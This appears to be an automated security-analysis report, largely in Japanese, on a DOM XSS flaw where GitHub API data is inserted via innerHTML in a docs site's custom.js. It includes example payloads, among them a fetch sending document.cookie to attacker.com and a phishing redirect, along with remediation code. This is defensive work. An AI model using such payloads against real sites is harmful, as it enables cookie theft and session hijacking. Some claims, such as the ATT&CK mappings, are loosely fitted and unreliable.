# Security Analysis: custom.js - DOM access operations

## ファイル情報

- **ファイルパス**: `repo/gitea/repositories/dodo/docs/en/docs/js/custom.js`
- **検出パターン**: DOM access operations

![高信頼度](https://img.shields.io/badge/信頼度-高-red) **信頼度スコア: 90**

## 脆弱性タイプ

- `XSS`

## PAR Policy Analysis

### Principals (データ源)

- **GitHub API v3 REST API (external untrusted source)** - Untrusted

### Actions (セキュリティ制御)

- **No validation, sanitization, or encoding applied** - Missing

### Resources (操作対象)

- **DOM innerHTML property at line 170** - Critical

### Policy Violations

- **XSS**: GitHub API response → v object properties → template literal → innerHTML
  - Severity: error | Confidence: 90%

## マッチしたソースコード

```javascript
document.querySelector
```

## 詳細解析

## XSS脆弱性: GitHub API データの未検証DOM挿入

### 脆弱性の概要

GitHub Search API から取得した外部データが、入力検証やサニタイズなしに直接 `innerHTML` で DOM に挿入されています。これにより、攻撃者が任意の JavaScript コードを実行できる可能性があります。

### 脆弱なコード分析

**コード箇所**: repo/gitea/repositories/dodo/docs/en/docs/js/custom.js, 165-171行目

```javascript
data.forEach(v => {
    if (v.full_name === 'tiangolo/fastapi') {
        return
    }
    const li = document.createElement('li')
    li.innerHTML = `<a href="${v.html_url}" target="_blank">★ ${v.stargazers_count} - ${v.full_name}</a> by <a href="${v.owner.html_url}" target="_blank">@${v.owner.login}</a>`
    ul.append(li)
})
```

### PAR (Principal-Action-Resource) フレームワーク分析

#### **Principal（プリンシパル - 信頼できないデータ源）**

GitHub API v3 Search Repositories Endpoint のレスポンス:
- `v.html_url`: リポジトリへのHTTP URL
- `v.full_name`: リポジトリの完全名 (e.g., "user/repo")
- `v.stargazers_count`: スター数（数値）
- `v.owner.html_url`: オーナープロフィールURL
- `v.owner.login`: オーナーのログイン名

外部API からのレスポンスは信頼できないデータです。特にリポジトリ情報（名前、URL）はユーザーが直接制御可能なため、悪意のあるペイロードを含む可能性があります。

#### **Action（アクション - セキュリティ制御）**

**現状**: セキュリティ制御が **完全に欠如**
- HTML エスケープ処理: なし
- 入力バリデーション: なし
- サニタイズ処理: なし
- Content Security Policy (CSP): 不明（別ファイルに記載の可能性）

データは直接テンプレートリテラル内に埋め込まれ、何の検証も経ずに HTML として解釈されます。

#### **Resource（リソース - 危険な操作）**

DOM 要素への `innerHTML` プロパティによる直接 HTML 挿入:
```javascript
li.innerHTML = `...${v.html_url}...${v.full_name}...${v.owner.html_url}...${v.owner.login}...`
```

`innerHTML` はブラウザに HTML を解釈させるため、含まれるスクリプトが実行されます。

### 攻撃シナリオ

#### シナリオ1: 悪意のあるリポジトリの作成
1. 攻撃者が GitHub で悪意のあるリポジトリを作成
2. リポジトリの `full_name` を特別に設定 (e.g., `attacker/<img src=x onerror="alert(document.cookie)">`)
3. FastAPI トピックでタグ付けして、API検索結果に含まれるようにする
4. 当該ページを訪問したユーザーのクライアント環境でスクリプトが実行される
5. クッキーやセッショントークンの窃取、CSRF攻撃の実行などが可能

#### シナリオ2: 中間者攻撃(MITM)による改ざん
1. HTTPS をサポートしていない通信路での MITM
2. または HTTPS ピンニングの欠如により通信路を盗聴・改ざん
3. GitHub API レスポンスを改ざんし、ペイロードを注入
4. ユーザーが訪問するたびにマルウェアが実行される

#### 具体的なペイロード例

```javascript
// リポジトリ名フィールドに以下を設定
v.full_name = "user/<img src=x onerror=\"fetch('https://attacker.com/steal?c=' + document.cookie)\">";

// または URL フィールド
v.html_url = "javascript:alert('XSS')";

// オーナー名フィールド
v.owner.login = "<svg onload=\"window.location='https://attacker.com/phishing'\">";
```

### 影響範囲

- **認証情報の窃取**: クッキー、ローカルストレージ、セッショントークン
- **セッションハイジャック**: ユーザーになりすまし可能
- **フィッシング**: フィッシング ページへのリダイレクト
- **マルウェア配布**: 悪意のあるスクリプト実行
- **CSRF 攻撃**: ユーザーに無断でアクション実行
- **ページ改ざん**: ユーザーに見える情報の改変

### 関連する脅威と分類

- **OWASP**: A03:2021 – Injection
- **CWE**: CWE-79 (Improper Neutralization of Input During Web Page Generation)
- **CVSS v3.1**: High severity (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N)
- **MITRE ATT&CK**: 
  - T1055: Process Injection
  - T1106: Native API (DOM API)
  - T1583: Acquire Infrastructure

### 推奨される修正

#### 修正1: DOM API を使用（推奨）

```javascript
data.forEach(v => {
    if (v.full_name === 'tiangolo/fastapi') {
        return
    }
    const li = document.createElement('li')
    
    // リンク1を作成
    const a1 = document.createElement('a')
    a1.href = v.html_url
    a1.target = '_blank'
    a1.textContent = `★ ${v.stargazers_count} - ${v.full_name}`
    
    // テキスト分割を作成
    const text = document.createTextNode(' by ')
    
    // リンク2を作成
    const a2 = document.createElement('a')
    a2.href = v.owner.html_url
    a2.target = '_blank'
    a2.textContent = `@${v.owner.login}`
    
    // DOM ツリーに追加
    li.appendChild(a1)
    li.appendChild(text)
    li.appendChild(a2)
    ul.append(li)
})
```

**利点**:
- HTML パースが行われない
- `textContent` はテキストとして扱われる
- JavaScript 実行の可能性が完全に排除される

#### 修正2: URL バリデーション + HTML エスケープ

```javascript
// URL バリデーション関数
const isValidUrl = (url) => {
    try {
        const parsed = new URL(url)
        return parsed.protocol === 'http:' || parsed.protocol === 'https:'
    } catch {
        return false
    }
}

// HTML エスケープ関数
const escapeHtml = (text) => {
    const div = document.createElement('div')
    div.textContent = text
    return div.innerHTML
}

data.forEach(v => {
    if (v.full_name === 'tiangolo/fastapi') {
        return
    }
    
    // URL バリデーション
    if (!isValidUrl(v.html_url) || !isValidUrl(v.owner.html_url)) {
        console.warn(`Invalid URL detected: ${v.html_url}`)
        return
    }
    
    const li = document.createElement('li')
    li.innerHTML = `<a href="${escapeHtml(v.html_url)}" target="_blank">★ ${escapeHtml(String(v.stargazers_count))} - ${escapeHtml(v.full_name)}</a> by <a href="${escapeHtml(v.owner.html_url)}" target="_blank">@${escapeHtml(v.owner.login)}</a>`
    ul.append(li)
})
```

#### 修正3: Content Security Policy (CSP)

HTML ファイルに以下を追加:
```html
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self'; img-src 'self' https:; style-src 'self' 'unsafe-inline';">
```

これにより、インラインスクリプトの実行がブロックされます。

### テスト方法

1. リポジトリ名に `<img src=x onerror=alert('XSS')>` を含むテストペイロードを使用
2. 修正後、ブラウザコンソールで alert が出現しないことを確認
3. ページの表示が正常に行われることを確認

